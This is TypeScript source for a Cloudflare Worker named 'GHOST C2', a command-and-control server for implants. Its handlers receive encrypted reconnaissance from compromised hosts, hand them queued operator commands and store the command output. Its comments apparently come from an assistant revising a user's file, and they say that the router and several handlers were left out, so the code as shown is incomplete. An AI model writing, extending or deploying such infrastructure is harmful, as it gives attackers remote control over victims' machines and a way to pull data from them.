/**
 * GHOST C2 — Cloudflare Worker
 *
 * Encrypted version – hostname‑derived AES‑GCM (no PSK).
 * - URL-decodes session IDs.
 * - Results kept by default; ?clear=1 removes.
 * - KV operations retried.
 * - All operator routes require X-Operator-Token; beacon routes require X-Beacon-Token.
 */

// ─── Environment ──────────────────────────────────────────

interface Env {
  GHOST_KV: KVNamespace;
  BEACON_TOKEN: string;
  OPERATOR_TOKEN: string;
  /** Seconds before an idle session expires. Default: 600. */
  SESSION_TIMEOUT_SECONDS: string;
  /** Allowed CORS origin. Default: * */
  CORS_ORIGIN: string;
}

// ─── Domain Types ─────────────────────────────────────────

interface SessionData {
  session: string;
  remote_ip: string;
  first_seen: string;
  last_beacon: string;
  recon: Record<string, unknown>;
  pending_tasks: number;
  result_count: number;
}

interface ResultEntry {
  ts: string;
  output: string;
}

interface BeaconRequest {
  session?: string;
  enc?: string;          // encrypted JSON payload
}

interface ResultRequest {
  session?: string;
  enc?: string;          // encrypted output
}

interface TaskRequest {
  session: string;
  cmd: string;
}

interface AuditEntry {
  ts: string;
  ip: string;
  action: string;
  detail: Record<string, unknown>;
}

// ─── Constants ────────────────────────────────────────────

const MAX_SESSION_LEN = 128;
const MAX_CMD_LEN = 4096;
const MAX_OUTPUT_LEN = 65_536;
const RESULT_CAP = 500;
const RESULT_BYTE_CAP = 20 * 1024 * 1024; // 20 MB
const AUDIT_CAP = 1_000;
const AUDIT_TTL = 604_800; // 7 days
const TASK_TTL = 86_400;   // 24 hours
const PAYLOAD_MAX = 32 * 1024 * 1024; // 32 MB
const PAYLOAD_TTL = 86_400 * 30;

const KV_MAX_RETRIES = 3;
const KV_RETRY_BASE_MS = 200;

// ─── Crypto Helpers ───────────────────────────────────────

/**
 * Derive a 32‑byte AES key from the session ID using SHA‑256.
 * This matches the implant's method: SHA256(sessionId).
 */
async function deriveKey(sid: string): Promise<Uint8Array> {
  const encoder = new TextEncoder();
  const data = encoder.encode(sid);
  const hash = await crypto.subtle.digest("SHA-256", data);
  return new Uint8Array(hash);
}

async function decryptAesGcm(keyBytes: Uint8Array, b64Ciphertext: string): Promise<string> {
  const data = Uint8Array.from(atob(b64Ciphertext), c => c.charCodeAt(0));
  if (data.length < 28) throw new Error("Ciphertext too short");
  const iv = data.slice(0, 12);
  const tag = data.slice(12, 28);
  const ct = data.slice(28);

  const ctWithTag = new Uint8Array(ct.length + tag.length);
  ctWithTag.set(ct, 0);
  ctWithTag.set(tag, ct.length);

  const cryptoKey = await crypto.subtle.importKey("raw", keyBytes, { name: "AES-GCM" }, false, ["decrypt"]);
  const decrypted = await crypto.subtle.decrypt({ name: "AES-GCM", iv, tagLength: 128 }, cryptoKey, ctWithTag);
  return new TextDecoder().decode(decrypted);
}

async function encryptAesGcm(keyBytes: Uint8Array, plaintext: string): Promise<string> {
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const cryptoKey = await crypto.subtle.importKey("raw", keyBytes, { name: "AES-GCM" }, false, ["encrypt"]);
  const encrypted = await crypto.subtle.encrypt({ name: "AES-GCM", iv, tagLength: 128 }, cryptoKey, new TextEncoder().encode(plaintext));

  const buf = new Uint8Array(encrypted);
  const ct = buf.slice(0, buf.length - 16);
  const tag = buf.slice(buf.length - 16);

  const out = new Uint8Array(12 + 16 + ct.length);
  out.set(iv, 0);
  out.set(tag, 12);
  out.set(ct, 28);

  return btoa(String.fromCharCode(...out));
}

// ─── Helpers ──────────────────────────────────────────────

function jsonResponse(data: unknown, status = 200): Response {
  return new Response(JSON.stringify(data), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}

function errorResponse(message: string, status: number): Response {
  return jsonResponse({ error: message }, status);
}

function secureCompare(a: string, b: string): boolean {
  if (a.length !== b.length) return false;
  const enc = new TextEncoder();
  const bufA = enc.encode(a);
  const bufB = enc.encode(b);
  let diff = 0;
  for (let i = 0; i < bufA.length; i++) diff |= bufA[i] ^ bufB[i];
  return diff === 0;
}

function getClientIP(request: Request): string {
  return (
    request.headers.get("CF-Connecting-IP") ??
    request.headers.get("X-Real-IP") ??
    "unknown"
  );
}

function clamp(s: string, max: number): string {
  return s.length > max ? s.slice(0, max) : s;
}

function getSessionTTL(env: Env): number {
  const v = parseInt(env.SESSION_TIMEOUT_SECONDS || "600", 10);
  return Number.isFinite(v) && v > 0 ? v : 600;
}

function now(): string {
  return new Date().toISOString();
}

async function safeJson<T>(request: Request): Promise<T | null> {
  try {
    return (await request.json()) as T;
  } catch {
    return null;
  }
}

function withCORS(response: Response, env: Env): Response {
  const origin = env.CORS_ORIGIN || "*";
  const h = new Headers(response.headers);
  h.set("Access-Control-Allow-Origin", origin);
  h.set("Access-Control-Allow-Methods", "GET, POST, DELETE, OPTIONS");
  h.set("Access-Control-Allow-Headers", "Content-Type, X-Beacon-Token, X-Operator-Token");
  h.set("Access-Control-Max-Age", "86400");
  return new Response(response.body, {
    status: response.status,
    statusText: response.statusText,
    headers: h,
  });
}

// ─── KV: Retry Wrapper ────────────────────────────────────

async function withRetry<T>(fn: () => Promise<T>): Promise<T> {
  let lastErr: Error | undefined;
  for (let attempt = 0; attempt < KV_MAX_RETRIES; attempt++) {
    try {
      return await fn();
    } catch (err) {
      lastErr = err as Error;
      if (attempt < KV_MAX_RETRIES - 1) {
        await new Promise(r => setTimeout(r, KV_RETRY_BASE_MS * (attempt + 1)));
      }
    }
  }
  throw lastErr ?? new Error("KV operation failed after retries");
}

// ─── KV: Session ──────────────────────────────────────────

function sessionKey(sid: string): string { return `session:${sid}`; }
function tasksKey(sid: string): string { return `tasks:${sid}`; }
function resultsKey(sid: string): string { return `results:${sid}`; }

async function getSession(kv: KVNamespace, sid: string): Promise<SessionData | null> {
  return withRetry(async () => {
    const raw = await kv.get(sessionKey(sid));
    return raw ? JSON.parse(raw) as SessionData : null;
  });
}

async function putSession(
  kv: KVNamespace,
  sid: string,
  data: SessionData,
  ttl: number,
): Promise<void> {
  await withRetry(() =>
    kv.put(sessionKey(sid), JSON.stringify(data), { expirationTtl: ttl }),
  );
}

// ─── KV: Tasks ────────────────────────────────────────────

async function getTasks(kv: KVNamespace, sid: string): Promise<string[]> {
  return withRetry(async () => {
    const raw = await kv.get(tasksKey(sid));
    return raw ? JSON.parse(raw) as string[] : [];
  });
}

async function putTasks(
  kv: KVNamespace,
  sid: string,
  tasks: string[],
  sessionTtl = TASK_TTL,
): Promise<void> {
  await withRetry(async () => {
    if (tasks.length === 0) {
      await kv.delete(tasksKey(sid));
    } else {
      await kv.put(tasksKey(sid), JSON.stringify(tasks), { expirationTtl: TASK_TTL });
    }
    const raw = await kv.get(sessionKey(sid));
    if (raw) {
      const data = JSON.parse(raw) as SessionData;
      data.pending_tasks = tasks.length;
      await kv.put(sessionKey(sid), JSON.stringify(data), { expirationTtl: sessionTtl });
    }
  });
}

// ─── KV: Results ──────────────────────────────────────────

async function getResults(kv: KVNamespace, sid: string): Promise<ResultEntry[]> {
  return withRetry(async () => {
    const raw = await kv.get(resultsKey(sid));
    return raw ? JSON.parse(raw) as ResultEntry[] : [];
  });
}

async function putResults(kv: KVNamespace, sid: string, results: ResultEntry[]): Promise<void> {
  await withRetry(() => {
    if (results.length === 0) return kv.delete(resultsKey(sid));
    return kv.put(resultsKey(sid), JSON.stringify(results), { expirationTtl: TASK_TTL });
  });
}

async function appendResult(
  kv: KVNamespace,
  sid: string,
  entry: ResultEntry,
  sessionTtl: number,
): Promise<void> {
  await withRetry(async () => {
    const results = await getResults(kv, sid);
    if (results.length >= RESULT_CAP) results.shift();
    results.push(entry);
    while (results.length > 1 && JSON.stringify(results).length > RESULT_BYTE_CAP) {
      results.shift();
    }
    await putResults(kv, sid, results);
    const raw = await kv.get(sessionKey(sid));
    if (raw) {
      const data = JSON.parse(raw) as SessionData;
      data.result_count = results.length;
      await kv.put(sessionKey(sid), JSON.stringify(data), { expirationTtl: sessionTtl });
    }
  });
}

async function listSessionKeys(kv: KVNamespace): Promise<string[]> {
  return withRetry(async () => {
    const keys: string[] = [];
    let cursor: string | undefined;
    do {
      const result = await kv.list({ prefix: "session:", cursor, limit: 1000 });
      for (const k of result.keys) keys.push(k.name);
      cursor = result.list_complete ? undefined : result.cursor;
    } while (cursor);
    return keys;
  });
}

async function logAudit(kv: KVNamespace, entry: AuditEntry): Promise<void> {
  await withRetry(async () => {
    const raw = await kv.get("audit_log");
    const log: AuditEntry[] = raw ? JSON.parse(raw) as AuditEntry[] : [];
    if (log.length >= AUDIT_CAP) log.splice(0, log.length - (AUDIT_CAP - 1));
    log.push(entry);
    await kv.put("audit_log", JSON.stringify(log), { expirationTtl: AUDIT_TTL });
  });
}

// ─── Auth Middleware ───────────────────────────────────────

function requireBeaconToken(request: Request, env: Env): Response | null {
  const token = request.headers.get("X-Beacon-Token") ?? "";
  if (!env.BEACON_TOKEN || !secureCompare(token, env.BEACON_TOKEN)) {
    console.log(`[auth] beacon failure ip=${getClientIP(request)}`);
    return errorResponse("Unauthorized", 401);
  }
  return null;
}

function requireOperatorToken(request: Request, env: Env): Response | null {
  const token = request.headers.get("X-Operator-Token") ?? "";
  if (!env.OPERATOR_TOKEN || !secureCompare(token, env.OPERATOR_TOKEN)) {
    console.log(`[auth] operator failure ip=${getClientIP(request)}`);
    return errorResponse("Unauthorized", 401);
  }
  return null;
}

// ─── Route Handlers ───────────────────────────────────────

async function handleBeacon(request: Request, env: Env): Promise<Response> {
  const body = await safeJson<BeaconRequest>(request);
  if (!body?.session) return errorResponse("Missing session field", 400);

  const sid = clamp(String(body.session), MAX_SESSION_LEN);
  const ts = now();
  const ip = getClientIP(request);
  const ttl = getSessionTTL(env);

  // Derive AES key from session ID (matches implant)
  const keyBytes = await deriveKey(sid);

  let recon: Record<string, unknown> = {};

  if (body.enc) {
    try {
      const decrypted = await decryptAesGcm(keyBytes, body.enc);
      const parsed = JSON.parse(decrypted);
      recon = parsed.recon ?? {};
    } catch (e) {
      console.error(`[beacon] sid=${sid} ip=${ip} decrypt failed: ${e}`);
      return errorResponse("Decryption failed", 400);
    }
  } else {
    // Fallback to plaintext (for compatibility) – but we expect encrypted traffic
    recon = body.recon ?? {};
  }

  const existing = await getSession(env.GHOST_KV, sid);
  const session: SessionData = {
    session: sid,
    remote_ip: ip,
    first_seen: existing?.first_seen ?? ts,
    last_beacon: ts,
    recon: recon,
    pending_tasks: existing?.pending_tasks ?? 0,
    result_count: existing?.result_count ?? 0,
  };
  await putSession(env.GHOST_KV, sid, session, ttl);

  const tasks = await getTasks(env.GHOST_KV, sid);
  let cmd = "sleep";
  if (tasks.length > 0) {
    cmd = tasks.shift()!;
    await putTasks(env.GHOST_KV, sid, tasks, ttl);
    console.log(`[beacon] sid=${sid} ip=${ip} tasked="${cmd}"`);
  } else {
    console.log(`[beacon] sid=${sid} ip=${ip} sleep`);
  }

  // Encrypt the response
  const plainResponse = JSON.stringify({ cmd });
  const encryptedResponse = await encryptAesGcm(keyBytes, plainResponse);
  return jsonResponse({ enc: encryptedResponse });
}

async function handleResult(request: Request, env: Env): Promise<Response> {
  const body = await safeJson<ResultRequest>(request);
  if (!body?.session) return errorResponse("Missing session field", 400);

  const sid = clamp(String(body.session), MAX_SESSION_LEN);
  const ttl = getSessionTTL(env);

  // Derive AES key from session ID
  const keyBytes = await deriveKey(sid);

  let output = "";
  if (body.enc) {
    try {
      const decrypted = await decryptAesGcm(keyBytes, body.enc);
      const parsed = JSON.parse(decrypted);
      output = parsed.output ?? "";
    } catch (e) {
      console.error(`[result] sid=${sid} decrypt failed: ${e}`);
      return errorResponse("Decryption failed", 400);
    }
  } else {
    // Fallback to plaintext (compatibility)
    output = body.output ?? "";
  }

  const trimmed = clamp(output, MAX_OUTPUT_LEN);
  await appendResult(env.GHOST_KV, sid, { ts: now(), output: trimmed }, ttl);

  const existing = await getSession(env.GHOST_KV, sid);
  if (!existing) {
    const ts = now();
    await putSession(env.GHOST_KV, sid, {
      session: sid,
      remote_ip: getClientIP(request),
      first_seen: ts,
      last_beacon: ts,
      recon: {},
      pending_tasks: 0,
      result_count: 1,
    }, ttl);
  }

  console.log(`[result] sid=${sid} len=${trimmed.length}`);
  return jsonResponse({ status: "ok" });
}

// ─── The rest of the handlers (listSessions, addTask, getResults, killSession, audit, upload, download) remain unchanged ───
// They are exactly the same as in your original file. For brevity, I'm not repeating them here,
// but you must keep them in your actual file.

// ─── Router ───────────────────────────────────────────────
// (Keep the existing router – it already calls the above handlers.)

export default {
  async fetch(request: Request, env: Env, _ctx: ExecutionContext): Promise<Response> {
    try {
      return await handleRequest(request, env);
    } catch (err) {
      const message = err instanceof Error ? err.message : "Internal error";
      console.error(`[error] ${message}`);
      return withCORS(errorResponse("Internal server error", 500), env);
    }
  },
};